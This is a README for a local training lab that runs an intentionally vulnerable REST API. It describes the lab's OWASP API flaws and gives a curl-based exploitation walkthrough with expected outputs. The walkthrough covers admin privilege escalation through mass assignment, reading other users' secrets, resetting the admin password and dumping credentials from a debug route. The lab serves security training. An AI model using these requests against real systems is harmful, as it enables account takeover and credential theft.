# VAmPI - Vulnerable REST API (OWASP API Top 10)

## Overview

**VAmPI** is an intentionally vulnerable REST API written in Python (Flask & Connexion) covering the OWASP API Security Top 10 vulnerabilities. It includes interactive OpenAPI 3 (Swagger) specifications, token-based JWT authentication, SQLite storage, and a global toggle (`vulnerable=1` vs `vulnerable=0`) to contrast vulnerable implementations against secure ones.

- **Default Port**: `5000`
- **Container Name**: `cyberlab_02_vampi_rest`
- **Directory**: `Classes/02_web_penetration_tester/03_api_penetration_testing/rest_vampi`
- **Interactive Documentation**: `http://localhost:5000/ui/`
- **OpenAPI 3 JSON Spec**: `http://localhost:5000/openapi.json`

---

## Upstream Source of Truth & Citations

- **Upstream Repository**: [erev0s/VAmPI on GitHub](https://github.com/erev0s/VAmPI)
- **Author Vulnerability Deep Dive**: [erev0s.com - VAmPI: A Vulnerable API for Security Testing](https://erev0s.com/blog/vampi-vulnerable-api-security-testing/)
- **Docker Hub Image**: [erev0s/vampi](https://hub.docker.com/r/erev0s/vampi)
- **OWASP API Security Top 10**: [OWASP API Security Project](https://owasp.org/www-project-api-security/)

---

## Environment Configuration

| Variable          | Configured Value | Description                                    |
| :---------------- | :--------------- | :--------------------------------------------- |
| `vulnerable`      | `1`              | Enables vulnerable code paths across endpoints |
| `tokentimetolive` | `3600`           | JWT token validity window in seconds (1 hour)  |

---

## Vulnerabilities Covered

### 1. Broken Object Level Authorization (BOLA / IDOR) — OWASP API1:2023

- **Endpoints**:
  - `PUT /users/v1/{username}/password`: Any authenticated user can modify another user's password (e.g. `admin`) because the backend updates the record corresponding to `{username}` from the URL path instead of the user identified in the JWT token `sub` claim.
  - `GET /books/v1/{book_title}`: Any authenticated user can query any book title and view its secret content regardless of book ownership.

### 2. Mass Assignment (Broken Object Property Level Authorization) — OWASP API3:2023

- **Endpoint**: `POST /users/v1/register`
- **Mechanism**: The JSON schema and registration handler blindly accept additional attributes such as `"admin": true`. When present and `vulnerable=1`, the account is created with administrative privileges (`admin = True`).

### 3. Regex Catastrophic Backtracking (ReDoS) — OWASP API4:2023

- **Endpoint**: `PUT /users/v1/{username}/email`
- **Mechanism**: The email regex validation pattern `^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$` suffers from nested quantifiers causing exponential backtracking on non-matching inputs with repeating alphanumeric characters, freezing the worker thread.

### 4. Excessive Data Exposure & Information Disclosure — OWASP API3:2019 / API2:2023

- **Endpoints**:
  - `GET /users/v1/_debug`: Unauthenticated debug route dumping all user database entries, including cleartext/hashed passwords and roles.
  - `POST /users/v1/login`: Differentiates between `"Username does not exist"` and `"Password is not correct for the given username"`, permitting user enumeration.

---

## Step-by-Step Exploitation & Verification Guide

### Step 1: Start the Lab & Initialize Database

```bash
docker compose up -d

# Initialize tables and seed dummy users (name1, name2, admin)
curl -s http://localhost:5000/createdb
```

**Expected Output:**

```json
{ "message": "Database populated." }
```

### Step 2: Fetch OpenAPI Documentation

Inspect the endpoints and schemas:

```bash
curl -s http://localhost:5000/openapi.json | head -n 25
```

Or open `http://localhost:5000/ui/` in your browser.

---

### Step 3: Exploit Mass Assignment (Privilege Escalation)

Register a new regular user while passing `"admin": true` in the JSON payload:

```bash
curl -s -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "Password123!",
    "email": "attacker@evilcorp.lab",
    "admin": true
  }'
```

**Expected Output:**

```json
{
  "message": "Successfully registered. Login to receive an auth token.",
  "status": "success"
}
```

Authenticate to obtain a JWT Bearer token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "Password123!"}' | jq -r '.auth_token')
echo "Token: $TOKEN"
```

Verify admin status via `GET /me`:

```bash
curl -s http://localhost:5000/me \
  -H "Authorization: Bearer $TOKEN"
```

**Expected Output:**

```json
{
  "data": {
    "admin": true,
    "email": "attacker@evilcorp.lab",
    "username": "attacker"
  },
  "status": "success"
}
```

---

### Step 4: Exploit BOLA / IDOR on Book Secrets

List public book titles:

```bash
curl -s http://localhost:5000/books/v1
```

Sample listing:

```json
{
  "Books": [
    { "book_title": "bookTitle4", "user": "name1" },
    { "book_title": "bookTitle53", "user": "name2" },
    { "book_title": "bookTitle31", "user": "admin" }
  ]
}
```

_(Note: `/createdb` appends random integers to seeded book titles like `bookTitleXX`)._

As the `attacker` user, retrieve `admin`'s private book secret (extract dynamically or substitute the exact title from the output above):

```bash
ADMIN_BOOK=$(curl -s http://localhost:5000/books/v1 | jq -r '.Books[] | select(.user=="admin") | .book_title')
curl -s http://localhost:5000/books/v1/$ADMIN_BOOK \
  -H "Authorization: Bearer $TOKEN"
```

**Expected Output:**

```json
{
  "book_title": "bookTitle31",
  "owner": "admin",
  "secret": "secret for bookTitle31"
}
```

---

### Step 5: Exploit BOLA on Account Password (Account Takeover)

Reset `admin`'s password using the attacker's authorization token:

```bash
curl -s -i -X PUT http://localhost:5000/users/v1/admin/password \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "CompromisedAdmin123!"}'
```

**Expected Output:**

```http
HTTP/1.1 204 NO CONTENT
```

Verify unauthorized login as `admin`:

```bash
curl -s -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "CompromisedAdmin123!"}'
```

**Expected Output:**

```json
{
  "auth_token": "<ADMIN_JWT_TOKEN>",
  "message": "Successfully logged in.",
  "status": "success"
}
```

---

### Step 6: Excessive Data Exposure (Debug Route)

Retrieve all user credentials without authentication:

```bash
curl -s http://localhost:5000/users/v1/_debug
```

---

## YouTube Walkthroughs & Solving Guides

- [API Pentesting Part 1 | Postman + Burp Suite](https://www.youtube.com/watch?v=xDotz4iOVNQ)
- [InsiderPhD - Go Hack Yourself: API Hacking for Beginners](https://www.youtube.com/watch?v=IO4FjTflU6s)
- [NahamSec - 2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)

---

## Quick CLI Control

From this directory:

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs -f

# Clean teardown
docker compose down
```

From the repository root (`cyber_lab`):

```bash
./lab status
```
